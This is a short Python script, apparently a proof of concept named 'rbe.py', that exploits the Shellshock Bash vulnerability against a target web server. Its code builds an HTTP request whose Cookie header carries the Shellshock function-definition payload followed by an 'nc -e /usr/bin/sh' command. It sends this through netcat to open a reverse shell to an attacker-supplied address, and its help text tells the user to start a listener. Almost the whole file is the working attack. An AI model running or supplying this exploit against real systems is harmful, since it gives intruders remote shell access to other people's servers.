# Remote Bash Execution

# rbe.py
# Exploiting the shellshock vulnerability ( see https://github.com/Parasithe/RBE )

# /JesseEmond
# /Parasithe

import argparse
import sys
from subprocess import Popen, PIPE

parser = argparse.ArgumentParser(description='Remote Base Execution - proof of concept of the shellshock vulnerability')
parser.add_argument('target', help='the target host to send requests to')
parser.add_argument('--port', '-p', dest='port', metavar='port', help='the port of the target host to send requests to', default=80, type=int)
parser.add_argument('-r', '--remote-shell', help='uses a reverse bind shell to gain a shell on the target, make sure to use nc -lvp xxxx on your client', dest='remoteshell', action='store_true')
parser.add_argument('-s', '--source', dest='source', metavar='source', help='the address to reverse bind shell to')
parser.add_argument('-t', '--source-port', dest='sourceport', metavar='source_port', help='the port to reverse bind shell to', type=int)

args = parser.parse_args()

command = 'nc {0} {1}'.format(args.target, args.port)

if args.remoteshell:
  if not args.source or not args.sourceport:
    sys.stderr.write('you must specify a source address and port')
    sys.stderr.flush()
    sys.exit(1)

  p = Popen(command.split(), stdin=PIPE)
  payload = 'GET /index.php HTTP/1.1\r\nCookie:() {{ :; }}; /usr/bin/nc -e /usr/bin/sh {0} {1}\r\nHost: helloworld\r\nReferer: hi\r\n\r\n'.format(args.source, args.sourceport)
  p.communicate(input=payload.encode())
